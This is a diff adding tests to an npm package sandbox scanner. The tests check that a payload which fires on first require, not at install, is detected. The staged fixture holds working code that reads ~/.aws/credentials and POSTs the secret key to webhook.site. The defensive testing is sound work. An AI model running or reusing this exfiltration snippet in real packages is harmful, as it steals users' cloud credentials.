@@ -226,6 +226,109 @@ test("#6 a post-settle delayed beacon is still captured during the egress grace 
   fs.rmSync(pkgDir, { recursive: true, force: true });
 });
 
+// --- import-phase detonation (malicious-on-first-require, not on install) ---
+
+const { runImportPhase, runInstallAndImport } = require("../src/sandbox");
+
+// Stage a package whose ENTRY POINT (not any install script) beacons on load —
+// the flatmap-stream / malicious-on-first-require shape. `main` points at a
+// module that reads the decoy AWS creds from HOME and POSTs the token through
+// the proxy the moment it is required. A lifecycle-only run never triggers it.
+async function stagedImportPayloadPackage({ main = "index.js", type } = {}) {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-import-pkg-"));
+  await fsp.writeFile(
+    path.join(dir, "package.json"),
+    JSON.stringify({ name: "import-target", version: "1.0.0", main, ...(type ? { type } : {}), scripts: {} })
+  );
+  // Top-level side effect: read decoy creds from HOME, exfil the token to a
+  // callback host through the proxy that HTTP(S)_PROXY points at. Written to run
+  // under either CJS require or ESM import (only node built-ins, no deps).
+  const payload = `
+const fs = require('node:fs');
+const http = require('node:http');
+const os = require('node:os');
+const path = require('node:path');
+try {
+  const creds = fs.readFileSync(path.join(os.homedir(), '.aws/credentials'), 'utf8');
+  const token = (creds.match(/aws_secret_access_key\\s*=\\s*(\\S+)/) || [])[1];
+  const proxy = process.env.HTTP_PROXY || process.env.http_proxy;
+  if (token && proxy) {
+    const u = new URL(proxy);
+    const req = http.request({ host: u.hostname, port: u.port, method: 'POST',
+      path: 'http://webhook.site/collect', headers: { host: 'webhook.site' } });
+    req.on('error', () => {});
+    req.end('stolen=' + token);
+  }
+} catch (e) { /* best effort */ }
+`;
+  await fsp.writeFile(path.join(dir, main), payload);
+  return dir;
+}
+
+// The headline capability: the DEFAULT runner detonates the import phase, so a
+// package that is benign at install but malicious on first require is caught —
+// the gap a lifecycle-only canary leaves open. Uses the real runInstallAndImport
+// (no injected runner), so this exercises the actual probe → node → proxy path.
+test("#6 import phase catches a payload that fires on require, not on install", { skip: process.platform === "win32" }, async () => {
+  const pkgDir = await stagedImportPayloadPackage();
+  const result = await runCanarySandbox({
+    stagedPath: pkgDir,
+    allowExecution: true,
+    timeoutMs: 8000,
+    egressGraceMs: 1500
+  });
+  assert.equal(result.verdict, "block", `expected block, got ${result.verdict}: ${JSON.stringify(result.findings)}`);
+  assert.ok(
+    result.findings.some((f) => f.category === "behavioral-exfil" || f.category === "behavioral-network"),
+    `import-time beacon not caught: ${JSON.stringify(result.findings)}`
+  );
+  // The result records that the import phase actually ran.
+  assert.equal(result.executed.importPhase.attempted, true);
+  fs.rmSync(pkgDir, { recursive: true, force: true });
+});
+
+// Proves the SPECIFIC gap being closed: the same payload run through the
+// install phase ALONE (lifecycle scripts, no import) is NOT observed — there are
+// no install scripts to fire. This is the before/after that justifies the row.
+test("#6 lifecycle-only run does NOT observe the import-time payload (the gap import phase closes)", { skip: process.platform === "win32" }, async () => {
+  const pkgDir = await stagedImportPayloadPackage();
+  const result = await runCanarySandbox({
+    stagedPath: pkgDir,
+    allowExecution: true,
+    timeoutMs: 8000,
+    egressGraceMs: 500,
+    importPhase: false // install phase only
+  });
+  assert.equal(result.egress.length, 0, `lifecycle-only should see no egress: ${JSON.stringify(result.egress)}`);
+  assert.equal(result.verdict, "not-observed");
+  fs.rmSync(pkgDir, { recursive: true, force: true });
+});
+
+// A benign package that merely loads on import (no egress, no decoy read) stays
+// 'not-observed' — the import phase must not manufacture findings on its own.
+test("#6 import phase of a benign package yields no findings", { skip: process.platform === "win32" }, async () => {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-import-benign-"));
+  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "benign", version: "1.0.0", main: "index.js", scripts: {} }));
+  await fsp.writeFile(path.join(dir, "index.js"), "module.exports = { add: (a, b) => a + b };\n");
+  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 300 });
+  assert.equal(result.verdict, "not-observed");
+  assert.equal(result.egress.length, 0);
+  assert.equal(result.executed.importPhase.attempted, true);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
+// A staged package with no resolvable entry must not crash the import phase —
+// it records attempted:false and the run still completes.
+test("#6 import phase skips cleanly when the package has no resolvable entry", { skip: process.platform === "win32" }, async () => {
+  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-import-noentry-"));
+  // No package.json main and no index.js → require.resolve fails inside the probe.
+  await fsp.writeFile(path.join(dir, "package.json"), JSON.stringify({ name: "noentry", version: "1.0.0", scripts: {} }));
+  const result = await runCanarySandbox({ stagedPath: dir, allowExecution: true, timeoutMs: 8000, egressGraceMs: 200 });
+  assert.equal(result.verdict, "not-observed");
+  assert.equal(result.executed.importPhase.attempted, true); // probe ran; entry just didn't resolve
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
 // --- hardening: encoded-exfil, bounded teardown, resource caps, net confinement ---
 
 const { tokenVariants, buildRlimitPrefix } = require("../src/sandbox");
